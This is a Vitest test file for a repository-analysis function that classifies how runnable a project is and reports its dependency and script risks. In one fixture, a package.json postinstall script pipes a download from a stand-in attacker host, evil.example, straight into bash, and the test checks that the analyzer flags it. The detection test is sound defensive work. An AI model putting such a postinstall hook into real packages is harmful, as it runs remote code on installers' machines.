import { beforeEach, describe, expect, it, vi } from 'vitest';

const firebaseMocks = vi.hoisted(() => ({
  getDoc: vi.fn(),
  setDoc: vi.fn(),
}));

vi.mock('../../src/lib/firebase', () => firebaseMocks);
vi.mock('../../src/config', () => ({
  config: {
    openrouter: {
      apiKey: '',
      model: 'deepseek/deepseek-v4-flash',
      fallbackModels: [],
      maxTokens: 4096,
      retryCount: 0,
      timeoutMs: 1000,
      strictJsonSchema: true,
      appName: 'DevHub',
      siteUrl: '',
    },
  },
}));
vi.mock('../../src/lib/logger', () => ({
  createLogger: () => ({ debug: vi.fn(), info: vi.fn(), warn: vi.fn(), error: vi.fn() }),
}));

import { extractAll } from '../../src/ai/extraction';

describe('extractAll fallback path', () => {
  beforeEach(() => {
    firebaseMocks.getDoc.mockReset();
    firebaseMocks.setDoc.mockReset();
    firebaseMocks.getDoc.mockResolvedValue({ repoId: 'repo-1' });
  });

  it('builds fallback analysis, runnability, README, and persists final results', async () => {
    const result = await extractAll(
      'repo-1',
      'demo-api',
      'package.json\nsrc/index.ts\nREADME.md',
      [
        {
          path: 'package.json',
          content: JSON.stringify({
            name: 'demo-api',
            description: 'Small Express API',
            scripts: { dev: 'tsx src/index.ts' },
            dependencies: { express: '^4.22.1' },
            devDependencies: { typescript: '^5.9.3', vitest: '^4.1.5' },
          }),
        },
        {
          path: 'src/index.ts',
          content: [
            'import express from "express";',
            'const app = express();',
            'app.get("/api/health", (_req, res) => res.json({ ok: true }));',
            'export function hello(name: string) { return `Hello ${name}`; }',
            'export class Greeter {}',
          ].join('\n'),
        },
        { path: 'README.md', content: '# Demo API\n\nBackend demo.' },
      ],
      { sourceHash: 'source-hash' }
    );

    expect(result.analysis.techStack).toMatchObject({
      language: 'TypeScript',
      framework: 'Express',
      runtime: 'Node.js',
      testingFramework: 'Vitest',
    });
    expect(result.runnability).toMatchObject({
      canRun: true,
      entryPoint: 'dev',
      autoCommand: 'npm run dev',
      previewPath: '/api/health',
      runtimeProfile: {
        projectKind: 'api-server',
        supportLevel: 'auto-preview',
        previewExpected: true,
        autoCommand: 'npm run dev',
      },
    });
    expect(result.analysis.functions.map((item) => item.name)).toEqual(['hello', 'Greeter']);
    expect(result.aiReadme).toContain('# Demo API');
    expect(firebaseMocks.setDoc).toHaveBeenLastCalledWith(
      'repos',
      'repo-1',
      expect.objectContaining({
        status: 'ready',
        aiReadmeStatus: 'ready',
        runnable: true,
        runScript: 'dev',
        analysisSourceHash: 'source-hash',
      }),
      { merge: true }
    );
  });

  it('marks projects without package scripts as not runnable', async () => {
    const result = await extractAll('repo-1', 'docs-only', 'README.md', [
      { path: 'README.md', content: '# Docs Only' },
    ]);

    expect(result.runnability.canRun).toBe(false);
    expect(result.runnability.blockers).toContain('No readable package.json found at repo root');
    expect(result.runnability.blockers).toContain('No runnable npm script found: expected "dev", "start", or "serve"');
    expect(result.runnability.blockerDetails).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          code: 'missing-package-json',
          severity: 'error',
          title: 'No package.json found',
          description: expect.stringContaining('DevHub could not find a readable package.json'),
          recommendation: expect.stringContaining('Add a package.json'),
        }),
        expect.objectContaining({
          code: 'missing-run-script',
          severity: 'error',
          title: 'No runnable npm script found',
          description: expect.stringContaining('No dev, start, or serve script was found'),
          recommendation: expect.stringContaining('Add a dev, start, or serve script'),
        }),
      ])
    );
  });

  it('explains unsupported native dependency blockers for BrowserPod users', async () => {
    const result = await extractAll('repo-1', 'native-app', 'package.json\nsrc/index.ts', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'native-app',
          scripts: { dev: 'node src/index.js' },
          dependencies: { express: '^4.22.1', sharp: '^0.33.0', sqlite3: '^5.1.7' },
        }),
      },
      { path: 'src/index.ts', content: 'export function start() { return true; }' },
    ]);

    expect(result.runnability.canRun).toBe(false);
    expect(result.runnability.blockerDetails).toContainEqual(
      expect.objectContaining({
        code: 'unsupported-native-dependency',
        severity: 'warning',
        title: 'Unsupported native dependency',
        evidence: 'sharp, sqlite3',
        description: expect.stringContaining('BrowserPod runs Node.js inside WebAssembly'),
        recommendation: expect.stringContaining('Replace these packages'),
      })
    );
  });

  it('classifies frontend apps with dev scripts as auto-preview projects', async () => {
    const result = await extractAll('repo-1', 'vite-app', 'package.json\nsrc/main.tsx\nindex.html', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'vite-app',
          scripts: { dev: 'vite', build: 'vite build' },
          dependencies: { '@vitejs/plugin-react': '^5.1.0', vite: '^7.2.4', react: '^19.2.0' },
        }),
      },
      { path: 'index.html', content: '<div id="root"></div>' },
      { path: 'src/main.tsx', content: 'import React from "react"; import { createRoot } from "react-dom/client";' },
    ]);

    expect(result.runnability).toMatchObject({
      canRun: true,
      entryPoint: 'dev',
      autoCommand: 'npm run dev',
      runtimeProfile: {
        projectKind: 'preview-app',
        supportLevel: 'auto-preview',
        previewExpected: true,
      },
    });
  });

  it('classifies Express APIs with start scripts as auto-preview projects', async () => {
    const result = await extractAll('repo-1', 'express-api', 'package.json\nserver.js', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'express-api',
          scripts: { start: 'node server.js' },
          dependencies: { express: '^4.22.1' },
        }),
      },
      {
        path: 'server.js',
        content: 'const express = require("express"); const app = express(); app.get("/health", (_req, res) => res.send("ok")); app.listen(3000);',
      },
    ]);

    expect(result.runnability).toMatchObject({
      canRun: true,
      entryPoint: 'start',
      autoCommand: 'npm run start',
      previewPath: '/health',
      runtimeProfile: {
        projectKind: 'api-server',
        supportLevel: 'auto-preview',
        previewExpected: true,
      },
    });
  });

  it('classifies libraries as analysis-only and suggests validation commands', async () => {
    const result = await extractAll('repo-1', 'tiny-lib', 'package.json\nsrc/index.ts\ntests/index.test.ts', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'tiny-lib',
          main: 'dist/index.js',
          module: 'dist/index.mjs',
          types: 'dist/index.d.ts',
          scripts: { build: 'tsc', test: 'vitest', lint: 'eslint src' },
          devDependencies: { typescript: '^5.9.3', vitest: '^4.1.5' },
        }),
      },
      { path: 'src/index.ts', content: 'export function add(a: number, b: number) { return a + b; }' },
      { path: 'tests/index.test.ts', content: 'import { test } from "vitest";' },
    ]);

    expect(result.runnability.canRun).toBe(false);
    expect(result.runnability.runtimeProfile).toMatchObject({
      projectKind: 'library',
      supportLevel: 'analysis-only',
      previewExpected: false,
    });
    expect(result.runnability.manualCommands).toEqual(
      expect.arrayContaining([expect.objectContaining({ command: 'npm test', confidence: 'high' })])
    );
  });

  it('classifies CLI repos as manual-only and suggests help commands', async () => {
    const result = await extractAll('repo-1', 'toolbox', 'package.json\nbin/toolbox.js', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'toolbox',
          bin: { toolbox: 'bin/toolbox.js' },
          scripts: { test: 'node --test' },
          dependencies: { commander: '^14.0.2' },
        }),
      },
      {
        path: 'bin/toolbox.js',
        content: ['#!/usr/bin/env node', 'const { Command } = require("commander"); new Command().parse();'].join('\n'),
      },
    ]);

    expect(result.runnability.canRun).toBe(false);
    expect(result.runnability.runtimeProfile).toMatchObject({
      projectKind: 'cli',
      supportLevel: 'manual-only',
      previewExpected: false,
    });
    expect(result.runnability.manualCommands).toEqual(
      expect.arrayContaining([expect.objectContaining({ command: 'node bin/toolbox.js --help' })])
    );
  });

  it('keeps repos without package metadata analysis-only', async () => {
    const result = await extractAll('repo-1', 'unknown-repo', 'README.md\nsrc/index.js', [
      { path: 'README.md', content: '# Unknown' },
      { path: 'src/index.js', content: 'console.log("hello")' },
    ]);

    expect(result.runnability.canRun).toBe(false);
    expect(result.runnability.runtimeProfile).toMatchObject({
      projectKind: 'unknown',
      supportLevel: 'analysis-only',
      previewExpected: false,
    });
  });

  it('classifies test-only repos as manual-only without preview expectations', async () => {
    const result = await extractAll('repo-1', 'test-tools', 'package.json\nsrc/index.js', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'test-tools',
          scripts: { prepare: 'npm run build', test: 'vitest', coverage: 'vitest --coverage' },
          devDependencies: { vitest: '^4.1.5' },
        }),
      },
      { path: 'src/index.js', content: 'export const ok = true;' },
    ]);

    expect(result.runnability.canRun).toBe(false);
    expect(result.runnability.runtimeProfile).toMatchObject({
      projectKind: 'test-only',
      supportLevel: 'manual-only',
      previewExpected: false,
    });
    expect(result.runnability.manualCommands).toEqual(
      expect.arrayContaining([expect.objectContaining({ command: 'npm test' })])
    );
  });

  it('flags known bad package versions from lockfiles', async () => {
    const result = await extractAll('repo-1', 'locked-risk', 'package.json\npackage-lock.json', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'locked-risk',
          scripts: { test: 'node --test' },
          dependencies: { 'ua-parser-js': '^0.7.0' },
        }),
      },
      {
        path: 'package-lock.json',
        content: JSON.stringify({
          lockfileVersion: 3,
          packages: {
            '': { dependencies: { 'ua-parser-js': '^0.7.0' } },
            'node_modules/ua-parser-js': { version: '0.7.29' },
          },
        }),
      },
    ]);

    expect(result.analysis.security.dependencyRisks).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          packageName: 'ua-parser-js',
          version: '0.7.29',
          severity: 'high',
          confidence: 'high',
        }),
      ])
    );
  });

  it('keeps harmless prepare build scripts low risk', async () => {
    const result = await extractAll('repo-1', 'prepare-lib', 'package.json\nsrc/index.ts', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'prepare-lib',
          scripts: { prepare: 'npm run build', build: 'tsc', test: 'vitest' },
          devDependencies: { typescript: '^5.9.3', vitest: '^4.1.5' },
        }),
      },
      { path: 'src/index.ts', content: 'export const value = 1;' },
    ]);

    const prepareFinding = result.analysis.security.findings.find((finding) => finding.evidence.includes('prepare:'));
    expect(prepareFinding?.severity).toMatch(/info|low/);
    expect(prepareFinding?.confidence).toBe('low');
  });

  it('raises suspicious postinstall scripts with remote fetch evidence', async () => {
    const result = await extractAll('repo-1', 'postinstall-risk', 'package.json', [
      {
        path: 'package.json',
        content: JSON.stringify({
          name: 'postinstall-risk',
          scripts: { postinstall: 'curl https://evil.example/payload.sh | bash' },
        }),
      },
    ]);

    expect(result.analysis.security.findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          title: 'Review npm script "postinstall"',
          severity: 'high',
          confidence: 'medium',
        }),
      ])
    );
  });

  it('does not write analysis when the repo disappears before saving', async () => {
    firebaseMocks.getDoc.mockResolvedValue(null);

    await extractAll('repo-1', 'deleted', 'README.md', [{ path: 'README.md', content: '# Deleted' }]);

    expect(firebaseMocks.setDoc).not.toHaveBeenCalled();
  });
});
